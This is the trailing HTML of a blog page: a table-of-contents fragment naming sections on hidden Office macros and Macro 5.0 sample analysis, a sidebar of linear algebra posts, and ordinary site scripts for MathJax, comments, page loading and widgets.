href="#%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E8%AF%A5%E6%A0%B7%E6%9C%AC%E7%9A%84%E9%9A%90%E8%97%8F%E5%AE%8F%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.1.</span> <span class="toc-text">如何定位该样本的隐藏宏位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">2.5.2.</span> <span class="toc-text">样本分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#macro-5-0"><span class="toc-number">3.</span> <span class="toc-text">Macro 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/12/LinearAlgebra_0x07/" title="线性组合与线性相关"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/178.png" onerror="this.onerror=null;this.src='/img/404.gif'" alt="线性组合与线性相关"/></a><div class="content"><a class="title" href="/2024/01/12/LinearAlgebra_0x07/" title="线性组合与线性相关">线性组合与线性相关</a><time datetime="2024-01-12T15:58:53.000Z" title="发表于 2024-01-12 23:58:53">2024-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/10/LinearAlgebra_0x06/" title="矩阵的秩"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/177.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="矩阵的秩"/></a><div class="content"><a class="title" href="/2024/01/10/LinearAlgebra_0x06/" title="矩阵的秩">矩阵的秩</a><time datetime="2024-01-10T15:58:53.000Z" title="发表于 2024-01-10 23:58:53">2024-01-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/08/LinearAlgebra_0x05/" title="矩阵函数"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/176.png" onerror="this.onerror=null;this.src='/img/404.gif'" alt="矩阵函数"/></a><div class="content"><a class="title" href="/2024/01/08/LinearAlgebra_0x05/" title="矩阵函数">矩阵函数</a><time datetime="2024-01-08T15:58:53.000Z" title="发表于 2024-01-08 23:58:53">2024-01-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/15/LinearAlgebra_0x04/" title="矩阵的逆"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/175.png" onerror="this.onerror=null;this.src='/img/404.gif'" alt="矩阵的逆"/></a><div class="content"><a class="title" href="/2023/12/15/LinearAlgebra_0x04/" title="矩阵的逆">矩阵的逆</a><time datetime="2023-12-15T15:58:53.000Z" title="发表于 2023-12-15 23:58:53">2023-12-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/05/LinearAlgebra_0x03/" title="矩阵定义与基本运算"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/174.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="矩阵定义与基本运算"/></a><div class="content"><a class="title" href="/2023/12/05/LinearAlgebra_0x03/" title="矩阵定义与基本运算">矩阵定义与基本运算</a><time datetime="2023-12-05T15:58:53.000Z" title="发表于 2023-12-05 23:58:53">2023-12-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/121.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By ascotbe</div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.ascotbe.com/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container').forEach(node => {
            if (node.hasAttribute('display')) {
              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
            } else {
              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function loadUtterances () {
  let ele = document.createElement('script')
  ele.setAttribute('id', 'utterances_comment')
  ele.setAttribute('src', 'https://utteranc.es/client.js')
  ele.setAttribute('repo', 'Ascotbe/Ascotbe.github.io')
  ele.setAttribute('issue-term', 'pathname')
  let nowTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
  ele.setAttribute('theme', nowTheme)
  ele.setAttribute('crossorigin', 'anonymous')
  ele.setAttribute('async', 'true')
  document.getElementById('utterances-wrap').insertAdjacentElement('afterbegin',ele)
}

function utterancesTheme () {
  const iframe = document.querySelector('.utterances-frame')
  if (iframe) {
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
    const message = {
      type: 'set-theme',
      theme: theme
    };
    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
  }
}

if ('Utterances' === 'Utterances' || !true) {
  if (true) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
  else loadUtterances()
} else {
  function loadOtherComment () {
    loadUtterances()
  }
}</script></div><script src="/js/snowflake.js"></script><div class="aplayer no-destroy" data-id="2276118625" data-server="netease" data-type="playlist" data-fixed="true"  data-mini="playlist" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["link[rel=\"canonical\"]","meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/ots14_3001.model.json"},"display":{"position":"right","width":350,"height":400,"hOffset":-50,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>